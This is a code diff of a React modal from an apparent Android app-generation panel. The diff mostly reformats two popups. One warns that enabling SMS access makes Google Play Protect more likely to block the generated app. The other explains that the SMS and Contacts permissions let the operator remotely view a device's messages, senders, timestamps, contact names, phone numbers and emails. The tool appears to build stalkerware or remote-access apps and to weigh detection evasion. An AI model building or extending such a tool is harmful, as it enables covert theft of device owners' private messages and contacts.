@@ -170,7 +170,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: Ap
                     {status === 'completed' ? 'App Ready!' : 'Customize Your App'}
                 </h2>
 
-                {status === 'idle' && (
+                {status === 'idle' && (<>
                     <div className="text-left space-y-4 mt-6 mb-8">
                         <div>
                             <label className="block text-sm font-medium text-white/70 mb-1">App Name</label>
@@ -312,128 +312,129 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: Ap
                         </div>
                     </div>
 
-            {/* Play Protect Warning Modal */}
-                {showPlayProtectWarning && (
-                    <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[100]" onClick={() => setShowPlayProtectWarning(false)}>
-                        <div className="bg-gradient-to-b from-red-900/90 to-red-950/95 rounded-2xl p-6 max-w-sm mx-4 border border-red-500/30 shadow-2xl" onClick={(e) => e.stopPropagation()}>
-                            <div className="flex items-center gap-3 mb-4">
-                                <div className="w-12 h-12 rounded-full bg-red-500/20 flex items-center justify-center">
-                                    <svg className="w-6 h-6 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
-                                    </svg>
+                    {/* Play Protect Warning Modal */}
+                    {showPlayProtectWarning && (
+                        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[100]" onClick={() => setShowPlayProtectWarning(false)}>
+                            <div className="bg-gradient-to-b from-red-900/90 to-red-950/95 rounded-2xl p-6 max-w-sm mx-4 border border-red-500/30 shadow-2xl" onClick={(e) => e.stopPropagation()}>
+                                <div className="flex items-center gap-3 mb-4">
+                                    <div className="w-12 h-12 rounded-full bg-red-500/20 flex items-center justify-center">
+                                        <svg className="w-6 h-6 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+                                        </svg>
+                                    </div>
+                                    <div>
+                                        <h3 className="text-lg font-bold text-white">Play Protect Warning</h3>
+                                        <p className="text-sm text-red-300/70">High Risk Detection</p>
+                                    </div>
                                 </div>
-                                <div>
-                                    <h3 className="text-lg font-bold text-white">Play Protect Warning</h3>
-                                    <p className="text-sm text-red-300/70">High Risk Detection</p>
+
+                                <p className="text-white/80 text-sm leading-relaxed mb-6">
+                                    Enabling <strong>SMS Access</strong> significantly increases the chance that <strong>Google Play Protect</strong> will detect and block this app.
+                                    The app may be flagged as harmful and prevented from installing.
+                                </p>
+
+                                <div className="flex gap-3">
+                                    <button
+                                        onClick={() => setShowPlayProtectWarning(false)}
+                                        className="flex-1 px-4 py-2.5 rounded-lg bg-white/10 text-white/80 hover:bg-white/20 transition-colors text-sm font-medium"
+                                    >
+                                        Cancel
+                                    </button>
+                                    <button
+                                        onClick={() => {
+                                            setEnableSmsPermission(true);
+                                            setShowPlayProtectWarning(false);
+                                        }}
+                                        className="flex-1 px-4 py-2.5 rounded-lg bg-red-500 text-white hover:bg-red-600 transition-colors text-sm font-medium"
+                                    >
+                                        I Understand
+                                    </button>
                                 </div>
                             </div>
+                        </div>
+                    )}
 
-                            <p className="text-white/80 text-sm leading-relaxed mb-6">
-                                Enabling <strong>SMS Access</strong> significantly increases the chance that <strong>Google Play Protect</strong> will detect and block this app.
-                                The app may be flagged as harmful and prevented from installing.
-                            </p>
-
-                            <div className="flex gap-3">
+                    {/* Permission Info Popup Modal */}
+                    {showPermissionInfo && (
+                        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm">
+                            <div className={`relative max-w-sm w-full mx-4 p-5 rounded-2xl border shadow-2xl ${showPermissionInfo === 'sms'
+                                ? 'bg-gradient-to-br from-blue-900/90 to-blue-950/90 border-blue-500/30'
+                                : 'bg-gradient-to-br from-green-900/90 to-green-950/90 border-green-500/30'
+                                }`}>
                                 <button
-                                    onClick={() => setShowPlayProtectWarning(false)}
-                                    className="flex-1 px-4 py-2.5 rounded-lg bg-white/10 text-white/80 hover:bg-white/20 transition-colors text-sm font-medium"
+                                    onClick={() => setShowPermissionInfo(null)}
+                                    className="absolute top-3 right-3 text-white/60 hover:text-white"
                                 >
-                                    Cancel
+                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                                 </button>
+
+                                {showPermissionInfo === 'sms' ? (
+                                    <>
+                                        <div className="flex items-center gap-3 mb-3">
+                                            <div className="p-2 rounded-lg bg-blue-500/20">
+                                                <svg className="w-6 h-6 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
+                                            </div>
+                                            <h4 className="text-lg font-bold text-white">SMS Access</h4>
+                                        </div>
+                                        <p className="text-sm text-blue-100/80 leading-relaxed">
+                                            Enabling this permission allows you to remotely view SMS messages on the device. You'll be able to see:
+                                        </p>
+                                        <ul className="mt-3 space-y-2 text-sm text-blue-200/70">
+                                            <li className="flex items-center gap-2">
+                                                <svg className="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                                Message content & body
+                                            </li>
+                                            <li className="flex items-center gap-2">
+                                                <svg className="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                                Sender/receiver information
+                                            </li>
+                                            <li className="flex items-center gap-2">
+                                                <svg className="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                                Date & timestamps
+                                            </li>
+                                        </ul>
+                                    </>
+                                ) : (
+                                    <>
+                                        <div className="flex items-center gap-3 mb-3">
+                                            <div className="p-2 rounded-lg bg-green-500/20">
+                                                <svg className="w-6 h-6 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
+                                            </div>
+                                            <h4 className="text-lg font-bold text-white">Contacts Access</h4>
+                                        </div>
+                                        <p className="text-sm text-green-100/80 leading-relaxed">
+                                            Enabling this permission allows you to remotely view contacts on the device. You'll be able to see:
+                                        </p>
+                                        <ul className="mt-3 space-y-2 text-sm text-green-200/70">
+                                            <li className="flex items-center gap-2">
+                                                <svg className="w-4 h-4 text-green-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                                Contact names
+                                            </li>
+                                            <li className="flex items-center gap-2">
+                                                <svg className="w-4 h-4 text-green-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                                Phone numbers
+                                            </li>
+                                            <li className="flex items-center gap-2">
+                                                <svg className="w-4 h-4 text-green-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                                Email addresses
+                                            </li>
+                                        </ul>
+                                    </>
+                                )}
+
                                 <button
-                                    onClick={() => {
-                                        setEnableSmsPermission(true);
-                                        setShowPlayProtectWarning(false);
-                                    }}
-                                    className="flex-1 px-4 py-2.5 rounded-lg bg-red-500 text-white hover:bg-red-600 transition-colors text-sm font-medium"
+                                    onClick={() => setShowPermissionInfo(null)}
+                                    className={`mt-5 w-full py-2 rounded-lg font-medium text-sm ${showPermissionInfo === 'sms'
+                                        ? 'bg-blue-500 hover:bg-blue-600'
+                                        : 'bg-green-500 hover:bg-green-600'
+                                        } text-white transition-colors`}
                                 >
-                                    I Understand
+                                    Got it
                                 </button>
                             </div>
                         </div>
-                    </div>
-                )}
-
-                {/* Permission Info Popup Modal */}
-                {showPermissionInfo && (
-                    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm">
-                        <div className={`relative max-w-sm w-full mx-4 p-5 rounded-2xl border shadow-2xl ${showPermissionInfo === 'sms'
-                            ? 'bg-gradient-to-br from-blue-900/90 to-blue-950/90 border-blue-500/30'
-                            : 'bg-gradient-to-br from-green-900/90 to-green-950/90 border-green-500/30'
-                            }`}>
-                            <button
-                                onClick={() => setShowPermissionInfo(null)}
-                                className="absolute top-3 right-3 text-white/60 hover:text-white"
-                            >
-                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
-                            </button>
-
-                            {showPermissionInfo === 'sms' ? (
-                                <>
-                                    <div className="flex items-center gap-3 mb-3">
-                                        <div className="p-2 rounded-lg bg-blue-500/20">
-                                            <svg className="w-6 h-6 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
-                                        </div>
-                                        <h4 className="text-lg font-bold text-white">SMS Access</h4>
-                                    </div>
-                                    <p className="text-sm text-blue-100/80 leading-relaxed">
-                                        Enabling this permission allows you to remotely view SMS messages on the device. You'll be able to see:
-                                    </p>
-                                    <ul className="mt-3 space-y-2 text-sm text-blue-200/70">
-                                        <li className="flex items-center gap-2">
-                                            <svg className="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                            Message content & body
-                                        </li>
-                                        <li className="flex items-center gap-2">
-                                            <svg className="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                            Sender/receiver information
-                                        </li>
-                                        <li className="flex items-center gap-2">
-                                            <svg className="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                            Date & timestamps
-                                        </li>
-                                    </ul>
-                                </>
-                            ) : (
-                                <>
-                                    <div className="flex items-center gap-3 mb-3">
-                                        <div className="p-2 rounded-lg bg-green-500/20">
-                                            <svg className="w-6 h-6 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
-                                        </div>
-                                        <h4 className="text-lg font-bold text-white">Contacts Access</h4>
-                                    </div>
-                                    <p className="text-sm text-green-100/80 leading-relaxed">
-                                        Enabling this permission allows you to remotely view contacts on the device. You'll be able to see:
-                                    </p>
-                                    <ul className="mt-3 space-y-2 text-sm text-green-200/70">
-                                        <li className="flex items-center gap-2">
-                                            <svg className="w-4 h-4 text-green-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                            Contact names
-                                        </li>
-                                        <li className="flex items-center gap-2">
-                                            <svg className="w-4 h-4 text-green-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                            Phone numbers
-                                        </li>
-                                        <li className="flex items-center gap-2">
-                                            <svg className="w-4 h-4 text-green-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                            Email addresses
-                                        </li>
-                                    </ul>
-                                </>
-                            )}
-
-                            <button
-                                onClick={() => setShowPermissionInfo(null)}
-                                className={`mt-5 w-full py-2 rounded-lg font-medium text-sm ${showPermissionInfo === 'sms'
-                                    ? 'bg-blue-500 hover:bg-blue-600'
-                                    : 'bg-green-500 hover:bg-green-600'
-                                    } text-white transition-colors`}
-                            >
-                                Got it
-                            </button>
-                        </div>
-                    </div>
-                )}
+                    )}
+                </>)}
 
                 {/* Status Views */}
                 {status === 'queued' && (
